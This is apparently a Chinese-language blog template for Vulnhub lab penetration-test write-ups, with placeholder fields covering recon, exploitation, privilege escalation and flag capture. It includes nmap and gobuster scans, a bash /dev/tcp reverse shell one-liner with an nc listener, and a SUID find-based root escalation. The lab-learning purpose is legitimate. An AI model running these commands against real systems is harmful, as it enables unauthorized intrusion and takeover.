---
title: Yone
published: 2026-08-17
description: 对 Vulnhub 平台 [靶机名称] 靶机的完整渗透测试记录，涵盖信息收集、漏洞利用与提权全过程。
image: ./cover.jpg
tags:
  - Vulnhub
  - 渗透测试
  - 靶机
  - 提权
category: Vulnhub
draft: false
pinned: false
lang: zh-CN
author: Ynm
comment: true
---


## 📖 靶机信息

*   **靶机名称**: [靶机名称]
*   **靶机难度**: [简单 / 中等 / 困难]
*   **靶机描述**: [靶机的简要描述，可从 Vulnhub 官网获取]
*   **下载地址**: [Vulnhub 官网下载链接]
*   **目标**: 获取 root 权限并找到 flag

## 🔍 信息收集 (Reconnaissance)
![](images/Pasted%20image%2020260817112333.png)
### 主机发现
*   使用 `netdiscover` 或 `nmap` 进行主机发现，确定靶机 IP 地址。
    ```bash
    sudo netdiscover -r [你的网段]/24
    # 或
    nmap -sn [你的网段]/24
    ```
*   **靶机 IP**: `[靶机 IP 地址]`

### 端口扫描
*   使用 `nmap` 对靶机进行全面的端口扫描，识别开放的服务和端口。
    ```bash
    nmap -sS -sV -p- -A -O [靶机 IP]
    ```
*   **扫描结果**:
    ```text
    [粘贴你的 nmap 扫描结果，例如：]
    PORT     STATE SERVICE    VERSION
    22/tcp   open  ssh        OpenSSH 7.4 (protocol 2.0)
    80/tcp   open  http       Apache httpd 2.4.6
    ...
    ```

### 目录扫描
*   如果开放了 Web 服务（如 80, 443 端口），使用 `dirb`、`gobuster` 或 `dirsearch` 等工具进行目录扫描。
    ```bash
    gobuster dir -u http://[靶机 IP] -w /usr/share/wordlists/dirb/common.txt
    ```
*   **发现的目录**:
    ```text
    [粘贴扫描到的目录，例如：]
    /admin
    /uploads
    /robots.txt
    ...
    ```

## 🔓 漏洞利用 (Exploitation)

### 漏洞分析
*   根据信息收集阶段获得的情报（如服务版本、Web 应用类型等），分析可能的攻击面。
*   **发现的漏洞**: [描述你发现的漏洞，例如：WordPress 插件存在文件上传漏洞]
*   **漏洞编号 (如有)**: [CVE-XXXX-XXXX]

### 利用过程
*   详细记录漏洞利用的步骤。这可以包括使用 Metasploit 模块、编写 Python 脚本或手动执行命令。
    ```bash
    # 示例：使用搜索到的 EXP 进行攻击
    python3 exploit.py --url http://[靶机 IP] --cmd "id"
    ```
*   **攻击结果**:
    ```text
    [粘贴命令执行后的输出结果，证明漏洞利用成功]
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```

### 获取初始 Shell
*   如果漏洞利用成功，尝试获取一个反向 Shell 或 Web Shell。
*   **使用的 Payload**:
    ```bash
    # 示例：使用 nc 获取反向 Shell
    nc -lvnp [监听端口]
    ```
    ```bash
    # 在目标机上执行
    bash -i >& /dev/tcp/[你的 IP]/[监听端口] 0>&1
    ```
*   **获取的权限**: `www-data` 或 `[用户名]`

## 🚀 权限提升 (Privilege Escalation)

### 信息收集 (提权辅助)
*   在获取低权限 Shell 后，进行系统信息收集，寻找提权向量。
    ```bash
    # 常用命令
    whoami
    id
    uname -a
    cat /etc/issue
    sudo -l
    find / -perm -4000 -type f 2>/dev/null
    ```
*   **关键发现**: [描述你发现的可提权信息，例如：内核版本过旧、存在 SUID 文件、sudo 配置错误等]

### 提权过程
*   根据收集到的信息，选择合适的提权方法（如内核漏洞利用、SUID 提权、sudo 提权等）。
    ```bash
    # 示例：利用 SUID 文件提权
    /usr/bin/find / -exec /bin/sh -p \; -quit
    ```
*   **提权结果**:
    ```text
    [粘贴提权成功后的输出，例如：]
    # id
    uid=0(root) gid=0(root) groups=0(root)
    ```

## 🏆 获取 Flag
*   在获得 root 权限后，通常在 `/root` 或 `/home` 目录下可以找到 flag 文件。
    ```bash
    cat /root/flag.txt
    ```
*   **Flag 值**: `[粘贴你的 flag 值]`

## 📝 总结与反思
*   **总结**: 回顾整个渗透过程，总结关键步骤和使用的技术。
*   **难点**: 分析过程中遇到的困难和挑战。
*   **学习点**: 从这次实践中学习到的新知识或技巧。
*   **改进**: 思考在哪些环节可以做得更好或更快。

## 🔗 参考资料
*   [Vulnhub 靶机官方页面]
*   [相关漏洞的 CVE 详情或 Exploit-DB 链接]
*   [其他有用的 Writeup 或技术文章]